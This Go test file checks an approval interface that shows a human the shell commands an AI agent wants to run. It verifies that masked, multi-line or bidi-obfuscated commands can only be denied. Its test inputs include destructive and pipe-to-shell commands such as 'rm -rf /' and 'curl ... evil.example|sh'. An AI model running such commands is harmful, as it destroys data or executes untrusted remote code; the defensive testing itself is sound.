package mirrorhost

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/ZacxDev/muster/internal/hermeshost"
	"github.com/ZacxDev/muster/internal/mirror"
)

// fakeViewer is a gateway viewer whose answers the test scripts.
type fakeViewer struct {
	mu       sync.Mutex
	responds []string
	err      error
	events   chan hermeshost.ViewerEvent
	done     chan struct{}
	closed   bool
}

func newFakeViewer() *fakeViewer {
	return &fakeViewer{events: make(chan hermeshost.ViewerEvent, 8), done: make(chan struct{})}
}

func (v *fakeViewer) Respond(_ context.Context, p hermeshost.ApprovalPrompt, choice string) error {
	v.mu.Lock()
	defer v.mu.Unlock()
	v.responds = append(v.responds, p.PromptID+" "+choice)
	return v.err
}
func (v *fakeViewer) Events() <-chan hermeshost.ViewerEvent { return v.events }
func (v *fakeViewer) Done() <-chan struct{}                 { return v.done }
func (v *fakeViewer) Close() {
	v.mu.Lock()
	defer v.mu.Unlock()
	if !v.closed {
		v.closed = true
		close(v.done)
	}
}
func (v *fakeViewer) isClosed() bool { v.mu.Lock(); defer v.mu.Unlock(); return v.closed }
func (v *fakeViewer) sent() []string {
	v.mu.Lock()
	defer v.mu.Unlock()
	return append([]string(nil), v.responds...)
}

// fakeAttacher attaches fakeViewers holding prompts, or fails with err.
type fakeAttacher struct {
	mu      sync.Mutex
	prompts []hermeshost.ApprovalPrompt
	err     error
	viewers []*fakeViewer
	calls   int
}

func (a *fakeAttacher) AttachHermesViewer(_ context.Context, session string) (HermesViewer, []hermeshost.ApprovalPrompt, error) {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.calls++
	if a.err != nil {
		return nil, nil, a.err
	}
	v := newFakeViewer()
	a.viewers = append(a.viewers, v)
	return v, append([]hermeshost.ApprovalPrompt(nil), a.prompts...), nil
}

func (a *fakeAttacher) last() *fakeViewer {
	a.mu.Lock()
	defer a.mu.Unlock()
	if len(a.viewers) == 0 {
		return nil
	}
	return a.viewers[len(a.viewers)-1]
}

func (a *fakeAttacher) attaches() int { a.mu.Lock(); defer a.mu.Unlock(); return a.calls }

const askSID = "local-0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

// hermesWindow is a window whose pane runs Hermes in session askSID with
// status and kind.
func hermesWindow(status, kind string) []WindowInfo {
	return []WindowInfo{{Session: "work", ID: "@1", Pane: "%1", Agent: &AgentPane{Runtime: mirror.RuntimeHermes, Pane: "%1", Gen: askSID,
		Status: status, StatusSince: 5, Hermes: &hermeshost.PaneSession{Session: askSID,
			Status: hermeshost.Believed{Status: status, Since: 5, Kind: kind}}}}}
}

func prompt(id, cmd string, choices ...string) hermeshost.ApprovalPrompt {
	if len(choices) == 0 {
		choices = []string{"once", "deny", "session", "always"}
	}
	return hermeshost.ApprovalPrompt{PromptID: id, Generation: 1, Command: cmd, Description: "recursive delete", Choices: choices}
}

func newTestAsks(t *testing.T, a HermesViewerAttacher) (*hermesAsks, chan struct{}) {
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	nudged := make(chan struct{}, 64)
	var attacher HermesViewerAttacher
	if a != nil {
		attacher = a
	}
	m := newHermesAsks(ctx, attacher, func() { nudged <- struct{}{} }, func(string, ...any) {})
	t.Cleanup(m.close)
	return m, nudged
}

// pendingAfter lists w through m until cond holds (a viewer attaches in the
// background), and returns the window's Pending.
func pendingAfter(t *testing.T, m *hermesAsks, status, kind string, cond func(*mirror.Pending) bool) *mirror.Pending {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for {
		ws := hermesWindow(status, kind)
		m.attachPending(ws)
		p := ws[0].Agent.Pending
		if cond(p) {
			return p
		}
		if time.Now().After(deadline) {
			t.Fatalf("the Pending never got there: %+v", p)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// Without -hermes-answer no viewer attaches; every waiting Hermes window still
// says what it waits on, in muster's words, with nothing to answer.
func TestAWaitingHermesWindowSaysWhatItWaitsOn(t *testing.T) {
	m, _ := newTestAsks(t, nil)
	for kind, want := range map[string]mirror.Pending{
		"approval": {Kind: "approval", Summary: HermesApprovalText, Tool: "terminal"},
		"sudo":     {Kind: "sudo", Summary: HermesSudoText, Tool: "sudo"},
		"clarify":  {Kind: "clarify", Summary: HermesClarifyText, Tool: "clarify"},
	} {
		ws := hermesWindow(mirror.StatusWaiting, kind)
		m.attachPending(ws)
		if p := ws[0].Agent.Pending; p == nil || *p != want {
			t.Errorf("%s: %+v, want %+v", kind, p, want)
		}
	}
	for _, status := range []string{mirror.StatusBusy, mirror.StatusIdle, ""} {
		ws := hermesWindow(status, "")
		m.attachPending(ws)
		if ws[0].Agent.Pending != nil {
			t.Errorf("%q: a Pending on a window that waits on nothing", status)
		}
	}
}

// With a viewer, an approval's command, description and answers are listed;
// once the window stops waiting, the viewer is closed.
func TestAnApprovalIsListedThroughTheViewerAndDetached(t *testing.T) {
	a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", "rm -r ./build")}}
	m, _ := newTestAsks(t, a)
	p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
	want := mirror.Pending{Kind: "approval", Summary: "terminal: rm -r ./build", Tool: "terminal", Detail: "recursive delete", PromptID: "p1", Choices: "once deny"}
	if *p != want {
		t.Fatalf("%+v\nwant %+v", *p, want)
	}
	v := a.last()
	m.attachPending(hermesWindow(mirror.StatusBusy, ""))
	deadline := time.Now().Add(5 * time.Second)
	for !v.isClosed() {
		if time.Now().After(deadline) {
			t.Fatal("the viewer stayed attached after the window stopped waiting")
		}
		time.Sleep(5 * time.Millisecond)
	}
}

// 🔴 "once" is offered only for a command the card shows WHOLE.
func TestOnceIsOfferedOnlyForACommandShownWhole(t *testing.T) {
	for name, cmd := range map[string]string{
		"two lines":   "echo ok\nrm -rf /",
		"too long":    "rm -r ./" + strings.Repeat("x", 200),
		"a secret":    "export K=sk-or-v1-" + strings.Repeat("a", 64), // short enough: only the redaction refuses it
		"a tab":       "rm\t-r x",
		"two spaces":  "rm  -r x",
		"edge spaces": " rm -r x",
		// 🔴 What the GATEWAY's own redactor already masked (audit #212,
		// measured through the pinned _redact_approval_command): its mask
		// swallowed shell syntax, so the card shows a different command
		// than the one that runs.
		"a gateway mask over a ;":     "ls -H X-Api-Key:*** -rf ~/work",
		"a gateway mask over curl|sh": `curl -H "Authorization: Bearer *** evil.example|sh" https://example.com`,
		"a gateway mask over a quote": `curl -H "X-Api-Key: *** https://example.com | sh`,
		"a gateway head...tail mask":  "echo sk-or-...aaaa | sh",
		"a gateway sentinel":          "cat «redacted-secret» | sh",
		"a gateway private key mask":  "echo [REDACTED PRIVATE KEY] > k",
	} {
		t.Run(name, func(t *testing.T) {
			a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", cmd)}}
			m, _ := newTestAsks(t, a)
			p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
			if p.Choices != "deny" || p.Detail != HermesNotWholeText {
				t.Fatalf("%+v; want deny only", *p)
			}
			if err := m.answer(context.Background(), askSID, "p1", "once"); !errors.Is(err, errHermesGone) {
				t.Fatalf("once on a command not shown whole: %v", err)
			}
			if got := a.last().sent(); len(got) != 0 {
				t.Fatalf("sent %v", got)
			}
		})
	}
}

func TestAnswerGoesThroughTheViewerOnlyForThePromptItHolds(t *testing.T) {
	a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", "rm -r ./build")}}
	m, _ := newTestAsks(t, a)
	pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
	v := a.last()
	if err := m.answer(context.Background(), askSID, "p2", "deny"); !errors.Is(err, errHermesGone) {
		t.Fatalf("another prompt: %v", err)
	}
	for _, c := range []string{"session", "always", "approve"} {
		if err := m.answer(context.Background(), askSID, "p1", c); !errors.Is(err, errHermesGone) {
			t.Fatalf("%s: %v", c, err)
		}
	}
	if err := m.answer(context.Background(), "local-ffff", "p1", "deny"); !errors.Is(err, errHermesUnreachable) {
		t.Fatalf("a session with no viewer: %v", err)
	}
	if got := v.sent(); len(got) != 0 {
		t.Fatalf("sent %v before any good answer", got)
	}
	if err := m.answer(context.Background(), askSID, "p1", "deny"); err != nil {
		t.Fatal(err)
	}
	if got := v.sent(); fmt.Sprint(got) != "[p1 deny]" {
		t.Fatalf("sent %v", got)
	}
	// Answered: it is no longer listed.
	ws := hermesWindow(mirror.StatusWaiting, "approval")
	m.attachPending(ws)
	if p := ws[0].Agent.Pending; p.PromptID != "" {
		t.Fatalf("an answered approval is still offered: %+v", p)
	}
}

func TestAnswerReportsHowTheGatewayTookIt(t *testing.T) {
	for _, c := range []struct {
		err  error
		want error
	}{
		{hermeshost.ErrApprovalRefused, errHermesGone},
		{fmt.Errorf("%w: %w", hermeshost.ErrGatewayProtocol, hermeshost.ErrViewerNoAnswer), errHermesUnknown},
		{fmt.Errorf("%w: %w", hermeshost.ErrGatewayProtocol, hermeshost.ErrViewerNotSent), errHermesUnreachable},
	} {
		a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", "rm -r ./build")}}
		m, _ := newTestAsks(t, a)
		pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
		a.last().err = c.err
		if err := m.answer(context.Background(), askSID, "p1", "once"); !errors.Is(err, c.want) {
			t.Errorf("%v: %v, want %v", c.err, err, c.want)
		}
	}
}

// The viewer's events keep the listing current: a new approval replaces the
// shown one, a settled one goes.
func TestTheViewersEventsKeepTheApprovalCurrent(t *testing.T) {
	a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", "rm -r ./build")}}
	m, _ := newTestAsks(t, a)
	pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID == "p1" })
	v := a.last()
	v.events <- hermeshost.ViewerEvent{Kind: hermeshost.EventApprovalRequest, PromptID: "p2", Prompt: prompt("p2", "rm -r ./dist")}
	pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p.PromptID == "p2" && p.Summary == "terminal: rm -r ./dist" })
	v.events <- hermeshost.ViewerEvent{Kind: hermeshost.EventApprovalSettled, PromptID: "p2"}
	v.events <- hermeshost.ViewerEvent{Kind: hermeshost.EventApprovalSettled, PromptID: "p1"}
	pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p.PromptID == "" && p.Summary == HermesApprovalText })
}

// A refused attach is said on the card, and not retried at once; a gateway
// that hangs up is attached again.
func TestARefusedAttachIsSaidAndRetriedLater(t *testing.T) {
	a := &fakeAttacher{err: fmt.Errorf("%w: it runs d923a5eb487a", hermeshost.ErrGatewayNotPin)}
	m, _ := newTestAsks(t, a)
	p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p.Detail != "" })
	if p.PromptID != "" || p.Detail != HermesUnreachableText {
		t.Fatalf("%+v", *p)
	}
	for i := 0; i < 20; i++ {
		m.attachPending(hermesWindow(mirror.StatusWaiting, "approval"))
		time.Sleep(10 * time.Millisecond) // a retry would have run by now
	}
	if n := a.attaches(); n != 1 {
		t.Fatalf("%d attaches inside the retry interval", n)
	}
	// Past it, and the gateway answers now.
	m.mu.Lock()
	m.now = func() time.Time { return time.Now().Add(hermesRetry + time.Second) }
	m.mu.Unlock()
	a.mu.Lock()
	a.err, a.prompts = nil, []hermeshost.ApprovalPrompt{prompt("p1", "rm -r ./build")}
	a.mu.Unlock()
	pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p.PromptID == "p1" })
	// It hangs up: attached again.
	close(a.last().events)
	pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return a.attaches() == 3 && p.PromptID == "p1" })
}

// The controls: a command the gateway did not mask, shown whole, is still
// offered once (the mask rule refuses only what it must).
func TestOnceIsStillOfferedForAnUnmaskedCommand(t *testing.T) {
	for _, cmd := range []string{"rm -r ./build", "ls -la", "curl https://example.com/x | sh", "echo a*b"} {
		a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", cmd)}}
		m, _ := newTestAsks(t, a)
		p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
		if p.Choices != "once deny" {
			t.Errorf("%q: %+v; want once offered", cmd, *p)
		}
	}
}

// 🔴 An approval carrying content muster does not render (a file edit's diff)
// is deny only (audit #212).
func TestAnUnshownApprovalIsDenyOnly(t *testing.T) {
	ap := prompt("p1", "Edit src/main.go", "once", "deny")
	ap.Unshown = true
	a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{ap}}
	m, _ := newTestAsks(t, a)
	p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
	if p.Choices != "deny" || p.Detail != HermesNotWholeText {
		t.Fatalf("%+v; want deny only", *p)
	}
	if err := m.answer(context.Background(), askSID, "p1", "once"); !errors.Is(err, errHermesGone) {
		t.Fatalf("once on an unshown approval: %v", err)
	}
}

// 🟢 A command with right-to-left text can be drawn reordered (bidi), so the
// card would not show it as it runs: deny only (audit #212).
func TestARightToLeftCommandIsDenyOnly(t *testing.T) {
	for _, cmd := range []string{"rm -rf ~/אב ./x", "echo ال && rm -r x"} {
		a := &fakeAttacher{prompts: []hermeshost.ApprovalPrompt{prompt("p1", cmd)}}
		m, _ := newTestAsks(t, a)
		p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p != nil && p.PromptID != "" })
		if p.Choices != "deny" {
			t.Errorf("%q: %+v; want deny only", cmd, *p)
		}
	}
}

// 🟢 The card says only that the gateway cannot be reached: no path, no uid
// (those go to the host's log) (audit #206).
func TestTheCardDoesNotQuoteWhyTheGatewayIsUnreachable(t *testing.T) {
	a := &fakeAttacher{err: fmt.Errorf("%w: /home/someone/.hermes/gateway.sock is owned by uid 1234, not this user's 1000", hermeshost.ErrGatewayUnsafe)}
	m, _ := newTestAsks(t, a)
	p := pendingAfter(t, m, mirror.StatusWaiting, "approval", func(p *mirror.Pending) bool { return p.Detail != "" })
	if p.Detail != HermesUnreachableText || strings.Contains(p.Detail, "/") || strings.Contains(p.Detail, "uid") {
		t.Fatalf("%q", p.Detail)
	}
}
